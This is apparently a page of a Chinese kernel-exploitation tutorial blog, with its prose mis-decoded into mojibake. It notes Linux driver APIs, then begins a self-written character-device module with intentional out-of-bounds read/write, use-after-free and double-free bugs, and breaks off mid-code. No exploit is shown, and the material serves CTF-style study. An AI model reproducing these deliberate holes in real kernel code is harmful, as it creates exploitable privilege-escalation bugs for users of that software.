class="comment">/*é”™è¯¯æ¡ä»¶ï¼Œé©±åŠ¨ç¨‹åºå¸¸ç”¨KERN_ERRæ¥æŠ¥å‘Šç¡¬ä»¶çš„é”™è¯¯*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERN_WARNING <span class="meta-string">&quot;&lt;4&gt;&quot;</span><span class="comment">/*è­¦å‘Šæ¡ä»¶ï¼Œå¯¹å¯èƒ½å‡ºç°é—®é¢˜çš„æƒ…å†µè¿›è¡Œè­¦å‘Š*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERN_NOTICE <span class="meta-string">&quot;&lt;5&gt;&quot;</span><span class="comment">/*æ­£å¸¸ä½†åˆé‡è¦çš„æ¡ä»¶ï¼Œç”¨äºæé†’ã€‚å¸¸ç”¨äºä¸å®‰å…¨ç›¸å…³çš„æ¶ˆæ¯*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERN_INFO <span class="meta-string">&quot;&lt;6&gt;&quot;</span><span class="comment">/*æç¤ºä¿¡æ¯ï¼Œå¦‚é©±åŠ¨ç¨‹åºå¯åŠ¨æ—¶ï¼Œæ‰“å°ç¡¬ä»¶ä¿¡æ¯*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERN_DEBUG <span class="meta-string">&quot;&lt;7&gt;&quot;</span><span class="comment">/*è°ƒè¯•çº§åˆ«çš„æ¶ˆæ¯*/</span></span></span><br></pre></td></tr></table></div></figure>


        <h5 id="kmalloc"   >
          <a href="#kmalloc" class="heading-link"><i class="fas fa-link"></i></a><a href="#kmalloc" class="headerlink" title="kmalloc:"></a><code>kmalloc</code>:</h5>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">kmalloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br></pre></td></tr></table></div></figure>

<p>å…¶ä¸­flagsä¸€èˆ¬è®¾ç½®ä¸ºGFP_KERNELæˆ–è€…GFP_DMAï¼Œåœ¨å †é¢˜ä¸­ä¸€èˆ¬å°±æ˜¯</p>
<p>GFP_KERNELæ¨¡å¼ï¼Œå¦‚ä¸‹ï¼š</p>
<p>ã€€|â€“ è¿›ç¨‹ä¸Šä¸‹æ–‡ï¼Œå¯ä»¥ç¡çœ ã€€ã€€ã€€ã€€ã€€GFP_KERNEL<br>ã€€|â€“ è¿›ç¨‹ä¸Šä¸‹æ–‡ï¼Œä¸å¯ä»¥ç¡çœ ã€€ã€€ã€€ã€€GFP_ATOMIC<br>ã€€|ã€€ã€€|â€“ ä¸­æ–­å¤„ç†ç¨‹åºã€€ã€€ã€€ã€€ã€€ã€€ã€€GFP_ATOMIC<br>ã€€|ã€€ã€€|â€“ è½¯ä¸­æ–­ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€GFP_ATOMIC<br>ã€€|ã€€ã€€|â€“ Taskletã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€GFP_ATOMIC<br>ã€€|â€“ ç”¨äºDMAçš„å†…å­˜ï¼Œå¯ä»¥ç¡çœ ã€€ã€€ã€€GFP_DMA | GFP_KERNEL<br>ã€€|â€“ ç”¨äºDMAçš„å†…å­˜ï¼Œä¸å¯ä»¥ç¡çœ ã€€ã€€GFP_DMA <strong>|GFP_ATOMIC</strong></p>
<p>å…·ä½“å¯ä»¥çœ‹</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/sky-heaven/p/7390370.html" >Linuxå†…æ ¸ç©ºé—´å†…å­˜ç”³è¯·å‡½æ•°kmallocã€kzallocã€vmallocçš„åŒºåˆ«ã€è½¬ã€‘ - sky-heaven - åšå®¢å›­ (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><code>kzmalloc</code>ç±»ä¼¼ï¼Œå°±æ˜¯åˆ†é…ç©ºé—´å¹¶ä¸”å†…å­˜åˆå§‹åŒ–ä¸º0</p>

        <h5 id="kfree"   >
          <a href="#kfree" class="heading-link"><i class="fas fa-link"></i></a><a href="#kfree" class="headerlink" title="kfree:"></a><code>kfree</code>:</h5>
      <p>è¿™ä¸ªå°±ä¸å¤šè¯´äº†ï¼Œå°±æ˜¯ç®€å•çš„é‡Šæ”¾ã€‚</p>

        <h5 id="copy-from-user"   >
          <a href="#copy-from-user" class="heading-link"><i class="fas fa-link"></i></a><a href="#copy-from-user" class="headerlink" title="copy_from_user:"></a><code>copy_from_user</code>:</h5>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy_from_user(<span class="keyword">void</span> *to, <span class="keyword">const</span> <span class="keyword">void</span> __user *from, <span class="keyword">unsigned</span> <span class="keyword">long</span> n)</span><br></pre></td></tr></table></div></figure>


        <h5 id="copy-to-user"   >
          <a href="#copy-to-user" class="heading-link"><i class="fas fa-link"></i></a><a href="#copy-to-user" class="headerlink" title="copy_to_user:"></a><code>copy_to_user</code>:</h5>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy_to_user(<span class="keyword">void</span> __user *to, <span class="keyword">const</span> <span class="keyword">void</span> *from, <span class="keyword">unsigned</span> <span class="keyword">long</span> n)</span><br></pre></td></tr></table></div></figure>

<p>è¿™ä¸¤ä¸ªå°±ä¸è®²äº†ï¼Œé¡¾åæ€ä¹‰ã€‚</p>

        <h5 id="æ³¨å†Œå‡½æ•°"   >
          <a href="#æ³¨å†Œå‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ³¨å†Œå‡½æ•°" class="headerlink" title="æ³¨å†Œå‡½æ•°"></a>æ³¨å†Œå‡½æ•°</h5>
      <p>å‰©ä¸‹çš„å¥½å¤šå°±æ˜¯å¸¸è§çš„æ³¨å†Œå‡½æ•°äº†</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alloc_chrdev_region(&amp;t_dev, <span class="number">0</span>, <span class="number">1</span>, <span class="string">&quot;xxx&quot;</span>);<span class="comment">//åŠ¨æ€åˆ†é…ä¸»è®¾å¤‡å·</span></span><br><span class="line">unregister_chrdev_region(t_dev, <span class="number">1</span>);<span class="comment">//ç§»é™¤æ¨¡å—æ—¶é‡Šæ”¾è®¾å¤‡å·</span></span><br><span class="line">xxx_class = class_create(THIS_MODULE, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">device_create(xxx_class, <span class="literal">NULL</span>, devno, <span class="literal">NULL</span>, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">cdev_init(&amp;c_dev, &amp;pugs_fops);</span><br><span class="line">cdev_add(&amp;c_dev, t_dev, <span class="number">1</span>);</span><br></pre></td></tr></table></div></figure>




        <h2 id="2-globalmemè™šæ‹Ÿè®¾å¤‡é©±åŠ¨"   >
          <a href="#2-globalmemè™šæ‹Ÿè®¾å¤‡é©±åŠ¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-globalmemè™šæ‹Ÿè®¾å¤‡é©±åŠ¨" class="headerlink" title="2.globalmemè™šæ‹Ÿè®¾å¤‡é©±åŠ¨"></a>2.globalmemè™šæ‹Ÿè®¾å¤‡é©±åŠ¨</h2>
      <p>è¿™ä¸ªä¸å¤ªæ¸…æ¥šï¼Œé¢˜ç›®è§çš„ä¹Ÿå°‘ï¼Œå…ˆå¿½ç•¥ã€‚</p>

        <h2 id="3-å—è®¾å¤‡"   >
          <a href="#3-å—è®¾å¤‡" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-å—è®¾å¤‡" class="headerlink" title="3.å—è®¾å¤‡"></a>3.å—è®¾å¤‡</h2>
      
        <h3 id="register-blkdev"   >
          <a href="#register-blkdev" class="heading-link"><i class="fas fa-link"></i></a><a href="#register-blkdev" class="headerlink" title="register_blkdev"></a>register_blkdev</h3>
      <p>ç”³è¯·è®¾å¤‡å·</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int ret = register_blkdev(xxx_dev_no,DEV_NAME);</span><br></pre></td></tr></table></div></figure>

<ul>
<li>å¦‚æœ<code>xxx_dev_no</code>ä¸º0åˆ™ç”±è¯¥å‡½æ•°è‡ªåŠ¨åˆ†é…è®¾å¤‡å·ï¼Œretå³ä¸ºè¿”å›çš„è®¾å¤‡å·</li>
<li><code>xxx_dev_no</code>ä¸ä¸º0åˆ™ä¾æ®è¯¥è®¾å¤‡å·è¿›è¡Œåˆ†é…</li>
</ul>

        <h3 id="unregister-blkdev"   >
          <a href="#unregister-blkdev" class="heading-link"><i class="fas fa-link"></i></a><a href="#unregister-blkdev" class="headerlink" title="unregister_blkdev"></a>unregister_blkdev</h3>
      <p>é‡Šæ”¾è®¾å¤‡å·</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unregister_blkdev(xxx_dev_no,DEV_NAME);</span><br></pre></td></tr></table></div></figure>



<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/king-77024128/articles/2262023.html" >printk()å‡½æ•°çš„æ€»ç»“ - æ·±è“å·¥ä½œå®¤ - åšå®¢å›­ (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/hac425/p/9416886.html" >Linux kernel pwn notesï¼ˆå†…æ ¸æ¼æ´åˆ©ç”¨å­¦ä¹ ï¼‰ - hac425 - åšå®¢å›­ (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://pwn4.fun/2016/10/21/Linux%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E5%AD%97%E7%AC%A6%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8/" >Linuxè®¾å¤‡é©±åŠ¨ï¼ˆäºŒï¼‰å­—ç¬¦è®¾å¤‡é©±åŠ¨ | BruceFanâ€™s Blog (pwn4.fun)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/09/06/Kernel%E4%BB%8E0%E5%BC%80%E5%A7%8B(%E4%B8%89)/">pwnKernelä»0å¼€å§‹(ä¸‰)</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-09-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-03-26</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="å‰è¨€"   >
          <a href="#å‰è¨€" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1>
      <p>è¿™é‡Œå°±å°è¯•ç”¨å †æ¥è§£é¢˜ï¼Œç”±äºkernelçš„è§£æ³•å¤šç§å¤šæ ·ï¼Œè¿™é‡Œæˆ‘ä»¬ä»æœ€ç®€å•çš„UAFå…¥æ‰‹</p>
<p>ç»™å‡ºè‡ªå·±è®¾è®¡çš„å †é¢˜ç›®ï¼Œå­˜åœ¨å¾ˆå¤šçš„æ¼æ´ï¼Œreadè¶Šç•Œè¯»ï¼Œeditè¶Šç•Œå†™ï¼ŒUAFï¼ŒDouble Freeç­‰ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/version.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kdev_t.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/device.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//è®¾å¤‡é©±åŠ¨å¸¸ç”¨å˜é‡</span></span><br><span class="line"><span class="comment">//static char *buffer_var = NULL;</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *buffer_var = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="keyword">class</span> *<span class="title">devClass</span>;</span> <span class="comment">// Global variable for the device class</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">cdev</span>;</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">dev_t</span> stack_dev_no;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">char</span>* data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//static char* notelist[1000];</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span>* notelist[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">note</span>* <span class="title">noteChunk</span>;</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">stack_read</span><span class="params">(struct file *filp, <span class="keyword">const</span> <span class="keyword">char</span> __user *buf,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *f_pos)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">stack_write</span><span class="params">(struct file *filp, <span class="keyword">const</span> <span class="keyword">char</span> __user *buf,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *f_pos)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">stack_ioctl</span><span class="params">(struct file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">stack_open</span><span class="params">(struct inode *i, struct file *f)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">stack_close</span><span class="params">(struct inode *i, struct file *f)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">stack_fops</span> =</span></span><br><span class="line">        &#123;</span><br><span class="line">                .owner = THIS_MODULE,</span><br><span class="line">                .open = stack_open,</span><br><span class="line">                .release = stack_close,</span><br><span class="line">                .write = stack_write,</span><br><span class="line">                .read = stack_read,</span><br><span class="line">                .unlocked_ioctl = stack_ioctl</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¾å¤‡é©±åŠ¨æ¨¡å—åŠ è½½å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">stack_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[i] Module stack registered&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (alloc_chrdev_region(&amp;stack_dev_no, <span class="number">0</span>, <span class="number">1</span>, <span class="string">&quot;stack&quot;</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((devClass = class_create(THIS_MODULE, <span class="string">&quot;chardrv&quot;</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        unregister_chrdev_region(stack_dev_no, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (device_create(devClass, <span class="literal">NULL</span>, stack_dev_no, <span class="literal">NULL</span>, <span class="string">&quot;stack&quot;</span>) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;[i] Module stack error&quot;</span>);</span><br><span class="line">        class_destroy(devClass);</span><br><span class="line">        unregister_chrdev_region(stack_dev_no, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cdev_init(&amp;cdev, &amp;stack_fops);</span><br><span class="line">    <span class="keyword">if</span> (cdev_add(&amp;cdev, stack_dev_no, <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        device_destroy(devClass, stack_dev_no);</span><br><span class="line">        class_destroy(devClass);</span><br><span class="line">        unregister_chrdev_region(stack_dev_no, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[i] &lt;Major, Minor&gt;: &lt;%d, %d&gt;\n&quot;</span>, MAJOR(stack_dev_no), MINOR(stack_dev_no));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¾å¤‡é©±åŠ¨æ¨¡å—å¸è½½å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">stack_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// é‡Šæ”¾å ç”¨çš„è®¾å¤‡å·</span></span><br><span class="line">    unregister_chrdev_region(stack_dev_no, <span class="number">1</span>);</span><br><span class="line">    cdev_del(&amp;cdev);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// è¯»è®¾å¤‡</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">stack_read</span><span class="params">(struct file *filp, <span class="keyword">const</span> <span class="keyword">char</span> __user *buf,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *f_pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Stack_read function&quot;</span> );</span><br><span class="line">    copy_to_user(buf,buffer_var,len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å†™è®¾å¤‡</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">stack_write</span><span class="params">(struct file *filp, <span class="keyword">const</span> <span class="keyword">char</span> __user *buf,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *f_pos)</span>  <span class="comment">//buffer overflow</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Stack_write function&quot;</span> );</span><br><span class="line">    copy_from_user(buffer_var, buf, len);</span><br><span class="line">    printk(<span class="string">&quot;[i] Module stack write: %s\n&quot;</span>,buffer_var);</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ioctlå‡½æ•°å‘½ä»¤æ§åˆ¶</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">stack_ioctl</span><span class="params">(struct file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* chunk = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> retval = <span class="number">0</span>;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Ioctl Get!\n&quot;</span>);</span><br><span class="line">    printk(<span class="string">&quot;notelist_addr:0x%llx\n&quot;</span>,&amp;notelist[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:<span class="comment">//add</span></span><br><span class="line">            <span class="comment">//noteChunk = (char *)kmalloc(sizeof(struct Note),GFP_KERNEL);</span></span><br><span class="line">            <span class="comment">//copy_from_user(noteChunk, arg, sizeof(struct Note));</span></span><br><span class="line"></span><br><span class="line">            printk(<span class="string">&quot;Kernel Add function!---001\n&quot;</span>);</span><br><span class="line">            noteChunk = (struct Note*)arg;</span><br><span class="line">            chunk = (<span class="keyword">char</span> *)kmalloc(noteChunk-&gt;len,GFP_KERNEL);</span><br><span class="line">            printk(<span class="string">&quot;chunk_addr:0x%llx\n&quot;</span>,chunk);</span><br><span class="line">            <span class="keyword">if</span> (!chunk)</span><br><span class="line">            &#123;</span><br><span class="line">                printk(<span class="string">&quot;Alloca Error\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">memcpy</span>(chunk, noteChunk-&gt;data,noteChunk-&gt;len);</span><br><span class="line">            notelist[count] = chunk;</span><br><span class="line">            chunk = <span class="literal">NULL</span>;</span><br><span class="line">            count ++;</span><br><span class="line">            printk(<span class="string">&quot;Add Success!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">888</span>: <span class="comment">//free without clean point and data</span></span><br><span class="line">            printk(<span class="string">&quot;Kernel Free function!---888\n&quot;</span>);</span><br><span class="line">            noteChunk = (struct Note*)arg;</span><br><span class="line">            printk(<span class="string">&quot;notelist:0x%llx\n&quot;</span>,notelist[noteChunk-&gt;idx]);</span><br><span class="line">            <span class="keyword">if</span> (notelist[noteChunk-&gt;idx])</span><br><span class="line">            &#123;</span><br><span class="line">                kfree(notelist[noteChunk-&gt;idx]);</span><br><span class="line">                <span class="comment">//notelist[noteChunk-&gt;idx] = NULL;</span></span><br><span class="line">                printk(<span class="string">&quot;Free Success!\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                printk(<span class="string">&quot;You can&#x27;t free it!There is no chunk!\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:<span class="comment">//edit   //UAF and overflow</span></span><br><span class="line">     